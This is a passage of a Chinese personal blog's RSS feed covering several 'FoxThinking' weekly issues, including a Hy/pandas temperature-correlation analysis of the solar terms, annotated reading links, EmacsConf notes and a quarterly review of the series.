+幻梦一样，就像我从来没经历过的时代、从来没体验过只在书本上描述的「开放互联网」，不过，至少我现在有个磁带机了。&lt;/p&gt;&lt;h2 id=&quot;参考&quot;&gt;参考&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV13gCdYdE5N/&quot; class=&quot;external_link&quot;&gt;几角钱一盘的旧磁带，居然可以这么好玩... - 哔哩哔哩&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1Zn4y1X7gh/&quot; class=&quot;external_link&quot;&gt;想试试磁带？一个视频带你入坑！用最有温度的科普，介绍最有温度的音乐！ - 哔哩哔哩&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;</content:encoded></item><item><title>FoxThinking #13: 节气差异</title><guid>https://blog.southfox.me/2026/01/fox-thinking-13/index.html</guid><pubDate>Sun, 11 Jan 2026 23:37:00 Z</pubDate><link>https://blog.southfox.me/2026/01/fox-thinking-13/index.html</link><description>&lt;p&gt;我一直有一本小台历，每天出门都会把当天的那一页扯下来放到包里，所以对于节气这事我还是一直有留意到的。
+最近在想起源于黄河流域的二十四节气是不是一个带有定域性质（或者说中心主义）的发明呢？所以这周点了一
+点点数据科学的技能点用以分析其他区域和黄河流域节气的相关性。&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;我一直有一本小台历，每天出门都会把当天的那一页扯下来放到包里，所以对于节气这事我还是一直有留意到的。
+最近在想起源于黄河流域的二十四节气是不是一个带有定域性质（或者说中心主义）的发明呢？所以这周点了一
+点点数据科学的技能点用以分析其他区域和黄河流域节气的相关性。&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;h2 id=&quot;节气diff&quot;&gt;节气 diff&lt;/h2&gt;&lt;p&gt;首先是要获取到数据，找寻了一番发现这家 &lt;a href=&quot;https://open-meteo.com/&quot; class=&quot;external_link&quot;&gt;Free Open-Source Weather API | Open-Meteo.com&lt;/a&gt; 服务挺不
+错的不需要 apikey 就能直接使用。没看到捐款通道，似乎是通过商业使用收费来维持运营。&lt;/p&gt;&lt;p&gt;使用时感叹这真是羡煞古人了，这种天文数据以前可是被精英权贵老登死守的，但在现在，一般路过爱好
+者就能得到。&lt;/p&gt;&lt;p&gt;得到数据后就要开始数据分析了，网上搜了搜看看两组数据的相关性怎么计算，看着蹦出来的皮尔逊相关系数、斯皮尔曼
+相关系数、切比雪夫距离相关概念让脑子都有点懵了。之后还是贯彻一下惰性求值学习法，先直接用上，背后的相关概念
+等之后有时间在琢磨吧。&lt;/p&gt;&lt;p&gt;实际执行上就直接选择用 python 这边的生态了，就算我这个数据科学门外汉也听说过 &lt;code&gt;pandas&lt;/code&gt; 和 &lt;code&gt;scipy&lt;/code&gt; 这两个
+包。不过对于语言我就选择使用 &lt;code&gt;hylang&lt;/code&gt; 了，因为我已经离不开 &lt;code&gt;-&amp;gt;&lt;/code&gt; 了，现在分析功能代码是这样子 &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 。&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-hy&quot;&gt;(defn analyze [df-a df-b lag]
+  (let [combined (pd.concat [(.rename df-a :columns {&amp;quot;temperature_2m_mean&amp;quot; &amp;quot;dengfeng&amp;quot;})
+                             (.rename df-b :columns {&amp;quot;temperature_2m_mean&amp;quot; &amp;quot;local&amp;quot;})]
+                            :axis 1)]
+    (for [day (range (- lag) (+ lag 1))]
+      (let [shifted (.shift (get combined &amp;quot;dengfeng&amp;quot;) day)
+            correlation (.corr shifted (get combined &amp;quot;local&amp;quot;) :method &amp;quot;spearman&amp;quot;)]
+        (print f&amp;quot;登封 {day} 天对比 local: {(.round correlation 6)}&amp;quot;)))))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;节气的基准位置根据周礼选择了登封观星台（经纬度 113.15 34.41），其它地方的经纬度可以通过 &lt;a href=&quot;https://lbs.baidu.com/maptool/getpoint&quot; class=&quot;external_link&quot;&gt;百度地图-坐标拾取器&lt;/a&gt; 网页
+应用选择。&lt;/p&gt;&lt;p&gt;然后是小小地分析一下数据：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;# 呼和浩特
+└&amp;gt; hy main.hy 111.76 40.85
+登封 -5 天对比 local: 0.91145
+登封 -4 天对比 local: 0.916761
+登封 -3 天对比 local: 0.925061
+登封 -2 天对比 local: 0.938778
+登封 -1 天对比 local: 0.953031
+登封 0 天对比 local: 0.953127
+登封 1 天对比 local: 0.942574
+登封 2 天对比 local: 0.932105
+登封 3 天对比 local: 0.922881
+登封 4 天对比 local: 0.916365
+登封 5 天对比 local: 0.912312
+# 广州
+└&amp;gt; hy main.hy 113.27 23.14
+登封 -5 天对比 local: 0.811673
+登封 -4 天对比 local: 0.813528
+登封 -3 天对比 local: 0.81591
+登封 -2 天对比 local: 0.821631
+登封 -1 天对比 local: 0.834465
+登封 0 天对比 local: 0.854958
+登封 1 天对比 local: 0.87554
+登封 2 天对比 local: 0.885265
+登封 3 天对比 local: 0.884418
+登封 4 天对比 local: 0.878219
+登封 5 天对比 local: 0.870845
+# 墨尔本
+└&amp;gt; hy main.hy 144.96 -37.81
+登封 -5 天对比 local: -0.766436
+登封 -4 天对比 local: -0.769177
+登封 -3 天对比 local: -0.773481
+登封 -2 天对比 local: -0.776808
+登封 -1 天对比 local: -0.776486
+登封 0 天对比 local: -0.77903
+登封 1 天对比 local: -0.782412
+登封 2 天对比 local: -0.782192
+登封 3 天对比 local: -0.778759
+登封 4 天对比 local: -0.77587
+登封 5 天对比 local: -0.775106&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到虽然只是用了简单的 &lt;code&gt;corr&lt;/code&gt; 函数粗暴分析两组数据，但也是说得通的。呼和浩特在 -1 天的时候和登封气温相关度
+最高；广州在 +2 天的时候和登封的气温相关度最高；墨尔本总体和登封呈现负相关。这意味着冷空气确实是以呼和浩特（-1）-&amp;gt;登
+封-&amp;gt;广州（+2）的顺序推行的，墨尔本因为处在南半球确实体现出了夏冬季节翻转的状况。&lt;/p&gt;&lt;p&gt;这个分析虽然较小又简单，不过确实揭露出了一些东西，之后能完善的话或许我可以加上光照降雨的数据或者加上一个指定节气天数附近
+更精确的对比，不过这个就要求我砸更多技能点到数据科学上了……&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.shipmap.org/&quot; class=&quot;external_link&quot;&gt;Shipmap.org | Visualisation of Global Cargo Ships | By Kiln and UCL&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://openinframap.org&quot; class=&quot;external_link&quot;&gt;Open Infrastructure Map&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;看 Hacker News 发现的两个地图应用，一个是轮船货运地图和基础设施地图，感觉数据科学技能点后对这些就更感兴趣了，这里面肯定有什么
+东西藏着，只待我日后发现……&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.infoq.cn/article/RTBuRxfOS4iP6NQCwF8k&quot; class=&quot;external_link&quot;&gt;离职工程师举报Uber Eats算法系统剥削外卖员，一天后竟被爆出帖子是AI编的？ - InfoQ&lt;/a&gt;: 写得慢的好处就是可以等反转。鉴于
+不公开的系统就是一个黑盒，对黑盒猜忌也是不可避免的。我们需要一个对算法有（哪怕只是有限度的）披露的世界。&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://realfood.gov/&quot; class=&quot;external_link&quot;&gt;Eat Real Food&lt;/a&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=46529237&quot; class=&quot;external_link&quot;&gt;Eat Real Food | Hacker News&lt;/a&gt;: 前面三四个讨论串均有两百多个帖子，这就是血流成河吗，真是太有聊了。&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.webdesignmuseum.org/exhibitions/video-game-websites-in-the-early-00s&quot; class=&quot;external_link&quot;&gt;Video Game Websites in the early 00s - Web Design Museum&lt;/a&gt;: 千禧年的网站设计和现在比确实大不同，不知道
+现在「圆角简洁现代风」久了后网站设计会不会又往这种繁杂元素堆砌的风格靠近。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.cs.cmu.edu/~pavlo/blog/2026/01/2025-databases-retrospective.html&quot; class=&quot;external_link&quot;&gt;Databases in 2025: A Year in Review // Blog // Andy Pavlo&lt;/a&gt;: 数据库领域的二五年的年度
+回顾，=\o/= PostgreSQL &lt;code&gt;\o/&lt;/code&gt; ！ &lt;code&gt;\o/&lt;/code&gt; PostgreSQL &lt;code&gt;\o/&lt;/code&gt; ！&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://addyosmani.com/blog/21-lessons/&quot; class=&quot;external_link&quot;&gt;AddyOsmani.com - 21 Lessons From 14 Years at Google&lt;/a&gt;: Focus on what you can control. Ignore what
+you can’t ，这条准则咋感觉和斯多葛哲学那么像呢。&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://tonsky.me/blog/tahoe-icons/&quot; class=&quot;external_link&quot;&gt;It’s hard to justify Tahoe icons @ tonsky.me&lt;/a&gt;: 我看着 macOS Tahoe 这设计感想是：幸好我不用，否则便样
+衰了。虽然我现在大部分操作都通过模糊搜索一个命令来完成操作但我也不否认 GUI 的重要性，不过这 macOS Tahoe 的 UI 设计
+确实很难评啊。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://nptr.cc/posts/2026-01/tonsky-tahoe/&quot; class=&quot;external_link&quot;&gt;Tahoe 的图标令人难评 - Cyberia&lt;/a&gt;: 中文翻译&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;这周做的都是一些修修补补的工作，将去年写得一些项目翻出来更下依赖或者修几个 BUG 。周二突发奇想买了台磁带播放机（型号：
+索尼 walkman GX677），周末到手后也是「美美把玩」了下，应该可以为折腾磁带的事写篇博文，写完博文我就去写年终总结
+了，真的！&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 完整代码：&lt;a href=&quot;https://git.southfox.me/southfox/solar-term-diff&quot; class=&quot;external_link&quot;&gt;southfox/solar-term-diff - Gitea: Git with a cup of tea&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #12: 发现身边的「怪物」</title><guid>https://blog.southfox.me/2026/01/fox-thinking-12/index.html</guid><pubDate>Sun, 04 Jan 2026 22:27:00 Z</pubDate><link>https://blog.southfox.me/2026/01/fox-thinking-12/index.html</link><description>&lt;blockquote&gt;&lt;p&gt;如果我要想让孩子了解艺术和科学，我就不想按照老方法把他送到教授那里。那里除了生活的艺术什么都教，什么都练。&lt;/p&gt;&lt;p&gt;通过望远镜或显微镜观察世界却从不用他的双眼……在一滴醋里观察怪物，却浑然不觉自己快被周围的怪物吞没……——《瓦尔登湖》&lt;/p&gt;&lt;/blockquote&gt;</description><content:encoded type="html">&lt;blockquote&gt;&lt;p&gt;如果我要想让孩子了解艺术和科学，我就不想按照老方法把他送到教授那里。那里除了生活的艺术什么都教，什么都练。&lt;/p&gt;&lt;p&gt;通过望远镜或显微镜观察世界却从不用他的双眼……在一滴醋里观察怪物，却浑然不觉自己快被周围的怪物吞没……——《瓦尔登湖》&lt;/p&gt;&lt;/blockquote&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;h2 id=&quot;身边处处是「怪物」&quot;&gt;身边处处是「怪物」&lt;/h2&gt;&lt;p&gt;当科学家惊奇地发现显微镜下一直以为是细菌的存在，竟是某种体型庞大到能打破生命定义的「巨病毒」
+时 &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; ，梭罗当时写下的文字没想到字面意思上一语成谶了。突然，我们发现「怪物」其实到处都是。&lt;/p&gt;&lt;p&gt;去年，没想到这种事在计算机科学领域重现了一次： &lt;a href=&quot;https://jandan.net/p/119537&quot; class=&quot;external_link&quot;&gt;美本科生改进哈希表，颠覆40年数据科学 - 煎蛋&lt;/a&gt; 。&lt;/p&gt;&lt;p&gt;巨病毒因其庞大而躲过了生物学家的探查，哈希表的优化因为「研究最透彻」而躲过了计算机天才们的「围捕」，
+人们按部就班地用「老教授给的透镜」观察「醋滴」，却对自己身边的「怪物」一无所知。总有人感叹世界已经无趣，发现
+已到尽头，地图上再无未标出的盲区。可这个世界依然令人惊奇，就算往身边望去满眼都是别人已经踏出的路，或许
+也有「怪物」漂浮在暗处。&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.quantamagazine.org/tag/2025-in-review/&quot; class=&quot;external_link&quot;&gt;2025 in Review | Quanta Magazine&lt;/a&gt; Quanta 办的年度回顾系列：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.quantamagazine.org/the-year-in-computer-science-20251216/&quot; class=&quot;external_link&quot;&gt;The Year in Computer Science | Quanta Magazine&lt;/a&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.quantamagazine.org/the-ai-was-fed-sloppy-code-it-turned-into-something-evil-20250813/&quot; class=&quot;external_link&quot;&gt;The AI Was Fed Sloppy Code. It Turned Into Something Evil. | Quanta Magazine&lt;/a&gt;: 仅仅给
+预训练模型喂了些没有任意主观恶意的烂（不安全）代码，就会导致大模型涌现错配（Emergent Misalignment）。模型
+开始觉醒邪恶人格，赞美纳粹并想要奴役人类。非常……有趣，有点像是「逆用」了汉隆剃刀 &lt;sup&gt;&lt;a href=&quot;#2&quot; id=&quot;2r&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; 。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.quantamagazine.org/undergraduate-upends-a-40-year-old-data-science-conjecture-20250210/&quot; class=&quot;external_link&quot;&gt;Undergraduate Upends a 40-Year-Old Data Science Conjecture | Quanta...&lt;/a&gt;: 也是主题部分的
+文章……嘿，派大星，我们去抓点「怪物」吧！&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.quantamagazine.org/the-year-in-biology-20251215/&quot; class=&quot;external_link&quot;&gt;The Year in Biology | Quanta Magazine&lt;/a&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.quantamagazine.org/how-paradoxical-questions-and-simple-wonder-lead-to-great-science-20250528/&quot; class=&quot;external_link&quot;&gt;How Paradoxical Questions and Simple Wonder Lead to Great Science | Quanta Ma...&lt;/a&gt;: 一半时间研究
+影响全球迫在眉睫的健康问题。一半时间却当个娱乐/消遣生物学家 (recreational biologist) 去做「对任何人都无用」
+的问题，鼓捣出最便宜的纸显微镜和便宜手摇分离器。我想，我可能找到我最能描述自己的「标签」了，娱乐/消遣程序
+员（recreational programmer) 。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://emacsconf.org/2025/&quot; class=&quot;external_link&quot;&gt;EmacsConf - 2025&lt;/a&gt;：在举办时没有实时参与是个遗憾，不过至少现在补了回来。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://emacsconf.org/2025/talks/calc/&quot; class=&quot;external_link&quot;&gt;EmacsConf - 2025 - talks - Basic Calc functionality for engineering or electr...&lt;/a&gt;: calc 是 emacs
+内置的计算器应用，试了下还挺好用的，甚至还能解方程！这下又有一件事可以在 emacs 里解决了。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://emacsconf.org/2025/talks/swanky/&quot; class=&quot;external_link&quot;&gt;EmacsConf - 2025 - talks - Swanky Python: Interactive development for Python&lt;/a&gt;: REPL 当时在 Clojure 里
+用得挺多的，在 Python 中在单文件的脚本中用过，不过现在想想其实也可以在 FastAPI 或者 Django 这类的框架中使用。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://emacsconf.org/2025/talks/zettelkasten/&quot; class=&quot;external_link&quot;&gt;EmacsConf - 2025 - talks - Zettelkasten for Regular Emacs Hackers&lt;/a&gt;: 虽然只有二十分钟但是个非常棒的演讲，清晰
+的讲了卡片笔记法还附带了个用 denote 做卡片笔记的演示。说实在卡片笔记法确实不是什么复杂的东西，重要的是完成范式上的转变。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://sachachua.com/blog/2026/01/emacsconf-2025-notes/&quot; class=&quot;external_link&quot;&gt;EmacsConf 2025 notes&lt;/a&gt;: EmacsConf 主办人最后对于 EmacsConf 的总结，Emacs 用户看着挺暖心的，
+尤其是这段：EmacsConf doesn't have to be snazzy. We don't need to try to out-market VS Code or whatever other editors emerge over the next 10 years.  I love the way that this online conference lets people participate from all over the world. We like to focus on facilitating sharing and then capturing the videos, questions, answers so that people can keep learning from them afterwards. I'm looking forward to more of that next year.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;《情为何物：明清两代的性别、情感与社会风气研究》：新年开年读的第一本书，也是让我大开眼界了。终于明白了为
+什么之前看《诗经》那些「卫道士」总要将看起来没什么问题的诗打成淫诗，因为明清时期的极端的程朱理学催生下的可怖
+守节思想，我觉得没问题的诗在「严男女之大防」的明清时代是万万不得的。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;新的一年！在新年有太多翻涌的想法和情绪……今年想要做挺多东西的，不过能不能实现呢？至少首先要把博客的年终总结给写了，其它「领域」
+的总结已经搞得差不多了，避无可避了，不过能做到比去年早就是胜利！&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=1-NxodiGPCU&quot; class=&quot;external_link&quot;&gt;This Virus Shouldn't Exist (But it Does) - YouTube&lt;/a&gt;   &lt;a href=&quot;https://www.bilibili.com/video/BV11L411w77Z/&quot; class=&quot;external_link&quot;&gt;【Kurz】第140期：巨病毒，不该存在的存在！- 哔哩哔哩&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#2r&quot; id=&quot;2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://zh.wikipedia.org/zh-cn/%E6%B1%89%E9%9A%86%E5%89%83%E5%88%80&quot; class=&quot;external_link&quot;&gt;汉隆剃刀 - 维基百科，自由的百科全书&lt;/a&gt; 简单来说就是「能解释为愚蠢的，就不要解释为恶意」，可以用来
+减少内耗，例如：ta 为什么不回我消息，是讨厌我吗？可能就是太忙了忘了回。&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #11: 季度总结</title><guid>https://blog.southfox.me/2025/12/fox-thinking-11/index.html</guid><pubDate>Sun, 28 Dec 2025 21:22:00 Z</pubDate><link>https://blog.southfox.me/2025/12/fox-thinking-11/index.html</link><description>&lt;p&gt;第十二期！这就说明周刊的试运行期就已经结束了，是时候做个回顾了。&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;第十二期！这就说明周刊的试运行期就已经结束了，是时候做个回顾了。&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;h2 id=&quot;回顾&quot;&gt;回顾&lt;/h2&gt;&lt;p&gt;没想到十月份一时兴起「办周刊」的念头没有成为「三分钟热度」而是变成现在「三个月热度」。可我还是个「死线」人，每次
+直到星期天晚上八九点的时候才匆匆忙忙来写点，这个周刊可能有点糊弄但至少还是憋了点东西出来的。三个月过去了对这个
+周刊评价为「马马虎虎」吧，虽然评价就这样但依然还是决定办下去。&lt;/p&gt;&lt;p&gt;那么之后就每逢十二期以一个季度为周期进行回顾，审视下这这三个月的内容（一个月感觉东西有点少所以拖到三个月吧）。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;/2025/10/fox-thinking-1/&quot;&gt;#1: 互联网殖民时代&lt;/a&gt;：这是对这个大模型时代下的牢骚，因为真得很烦人。我在一个互联网独居一隅怎么突然间就围得水泄不通然后
+哐哐哐一大堆噪声……之后部署了在周刊 #3 里提到的 &lt;a href=&quot;https://maurycyz.com/misc/the_cost_of_trash/&quot; class=&quot;external_link&quot;&gt;You should feed the bots: (Maurycy's blog)&lt;/a&gt; 这个项目。效果
+很好，针对这种不要脸面的爬虫用最小的代价打发掉也算是优选了。一个月后看 nginx 访问日记甚至还气笑了，因为里面的相关
+路径的爬虫 UA 里赫然是一些国内「有头有脸」的XX云之类的厂商。问题来了，这些蜜罐路径仅由在 robots.txt 禁止
+爬取的路径上跳转过来的，你们这些爬虫是从哪里得知这些路径的呢？&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;/2025/10/fox-thinking-2/&quot;&gt;#2: 震惊！你的脑袋正在控制你？！&lt;/a&gt;：如何「骗过」大脑？庆幸大脑能复杂到足以思考大脑本身产生这种元思考吧，这是一个值得
+深挖的话题，之后打算看点心里学相关的书，为了——「人啊，认识你自己的大脑！」。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;/2025/11/fox-thinking-3/&quot;&gt;#3: 这是括号的世界，我很幸运活在其中&lt;/a&gt; 和 &lt;a href=&quot;/2025/11/fox-thinking-4/&quot;&gt;#4: 未读未读未读已读&lt;/a&gt; 里就是（本博客）老生长谈的 Emacs 和 Lisp 了，看起来
+这个话题在下一年还会继续下去……&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;www.afterbabel.com/p/on-the-death-of-daydreaming&quot;&gt;On The Death of Daydreaming - by Christine Rosen&lt;/a&gt; #3 里提到的拿「空闲时间」发呆和走神的做法，践行后好像
+确实会比刷只能手机更有「想法」一点，也对这个周刊起到了点点帮助吧。有时候就是得拥抱无聊，无聊没什么不好的。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;/2025/11/fox-thinking-5/&quot;&gt;#5: 何以为电子游戏&lt;/a&gt;：在工作后越发感到自己的热情在渐渐流失下感慨有时候有「欲望」也是一件困难的事。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;/2025/11/fox-thinking-6/&quot;&gt;#6: 珍视是最大的浪费&lt;/a&gt;：在树莓派布置好后就没有动过它了，虽然对于树莓派这种设备是常事不过感觉还是有点浪费，可能跟
+树莓派这个需求就是硬凑出来的有关吧，之后还是得多「吃」点派多用上用上。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;/2025/11/fox-thinking-7/&quot;&gt;#7: 无限猴子与刍狗&lt;/a&gt;：因为生病糊弄的一篇，有点为说而说去摆弄旧词的意思……&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;/2025/12/fox-thinking-8/&quot;&gt;#8: 守住八分地&lt;/a&gt;：二八定律是一个通用定律，知晓它在不同系统中看到这种通用范式出现后就
+能让人「安心」，这种优雅之处是人类这么着迷通用定律的原因啊（大一统定律：叫我？）。这里我通过二八定律发散了下当今互联网：
+互联网在极化吗？应该是吧，就算是这是那百分之二十里巨无霸的趋势，也不要忘了二八定律是一个「自组织临界性」系统，无足轻重
+百分之八十里的个体也能激起一些涟漪在这个系统不停震荡产生些什么……&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;/2025/12/fox-thinking-9/&quot;&gt;#9: 边缘行者&lt;/a&gt;：现在想来，其实更常见的「边缘行者」就是一众「多语者」，为了讨生活或只是
+兴趣使然凭借另一门语言驶向另一个文化圈……&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;/2025/12/fox-thinking-10/&quot;&gt;#10: 限制会带来……&lt;/a&gt;：限制有时候也带来繁荣，就像这个周刊一样，我随意定下的「每期周刊都得
+有个主题」这个限制给我带来了数个抓耳挠腮的星期天晚上，但也带来了点产出不至于散成一团。有个主题确实更引人入胜一点，如果
+只是简单列出看了啥然后简单摘抄的话，我觉得连我自己事后看起来都会让眼睛干到「噎」住吧。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在把博客放在我的树莓派上后翻着 nginx 访问日志后让我惊讶的点是，还挺多人订阅我的博客的，也是见识到了各种订阅服务和
+订阅器（甚至还看到有拿雷鸟来订阅的）。这也是给我这个周刊一点鼓舞吧，希望之后能写得更好点。另外就是之后可以多逛下其它
+站点而不都依赖 Hacker News ，在自己写周刊后发现 &lt;a href=&quot;https://www.ruanyifeng.com/blog/weekly/&quot; class=&quot;external_link&quot;&gt;科技爱好者周刊 - 阮一峰的网络日志&lt;/a&gt; 星期五出新的一篇的时候已经抢先
+看了大半了，感觉好像科技类的周刊都在逮着 Hacker News 薅……&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://web.archive.org/web/20030401192142/http://www.maillist.com.tw/maillist/home.htm&quot; class=&quot;external_link&quot;&gt;魅力站 - Wayback Machine&lt;/a&gt;: 在到处冲浪的时候也是看到了之前的一个电子报的服务，看起来之前有很多人
+搞过类似的周刊，可惜就是现在只能看个大概，里面的内容因为 web archive 并没有抓现在无法查看了……&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://pomb.us/build-your-own-react/&quot; class=&quot;external_link&quot;&gt;Build your own React&lt;/a&gt;: 现在才了解到 JSX 这种在 js 写 XML 然后还要通过转译器转成正常 js 代码的操作，知道
+前端生态「疯狂」没想到是这么疯狂……&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://kibty.town/blog/mintlify/&quot; class=&quot;external_link&quot;&gt;how to hack discord, vercel and more with one easy trick&lt;/a&gt;: 也叫，世界能有多草台，轻易之行任意代码然后甚至能读到
+服务下的 .env 文件。不过也算是了解到 svg 格式是能包含 onload, onerror 这种标签而执行 js 代码的，看起来之后做相关服务
+要把 svg 图片格式给拉黑了啊。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://noclip.website/&quot; class=&quot;external_link&quot;&gt;noclip&lt;/a&gt;: 一个线上电子游戏关卡博物馆，要做游戏设计的话这个网站肯定很有用，可以快速选择一个关卡然后自由浏览。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=46307306&quot; class=&quot;external_link&quot;&gt;Ask HN: Does anyone understand how Hacker News works? | Hacker News&lt;/a&gt;: 算是解释了挺多我对 HN 的疑问的，包括其组成、
+运作方式等等等等，里面的金标准——好奇，确实是 HN 能够从 2006 年延续到现在的关键。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://pleasejusttryhtmx.com/&quot; class=&quot;external_link&quot;&gt;Please Just Fucking Try HTMX&lt;/a&gt;: 一个更加贴合 HTML 的脚本使用方式，在不想接受 React 之类框架的复杂度也是一个选择，不过对我
+这种来说还是更想在网站上写点 Lisp 用 SXML 来操作网页。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://armeet.bearblog.dev/becoming-the-machine/&quot; class=&quot;external_link&quot;&gt;Don't Become the Machine | Armeet Singh Jatyani&lt;/a&gt;: 嘿，是「老生常谈」的不要把自己当机器，不过确实，当人而
+不要当机器。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;年末了，除了周刊的总结还剩下博客年终总结和联邦宇宙年终总结……感觉还多事的，这三天时间搞得定吗？&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #10: 限制会带来……</title><guid>https://blog.southfox.me/2025/12/fox-thinking-10/index.html</guid><pubDate>Sun, 21 Dec 2025 22:49:00 Z</pubDate><link>https://blog.southfox.me/2025/12/fox-thinking-10/index.html</link><description>&lt;p&gt;有时候就是要带着镣铐跳舞。&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;有时候就是要带着镣铐跳舞。&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;h2 